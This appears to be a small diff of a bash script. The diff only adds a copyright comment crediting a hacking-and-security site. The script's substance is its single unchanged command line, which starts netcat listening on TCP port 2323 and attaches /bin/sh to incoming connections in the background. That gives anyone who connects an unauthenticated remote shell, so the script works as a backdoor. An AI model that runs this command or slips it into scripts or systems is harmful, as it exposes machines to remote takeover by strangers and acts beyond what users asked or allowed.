@@ -1,2 +1,3 @@
 #!/bin/bash
+# (c) hacking y seguridad .com 2022
 nc -l -t -p 2323 -e /bin/sh &
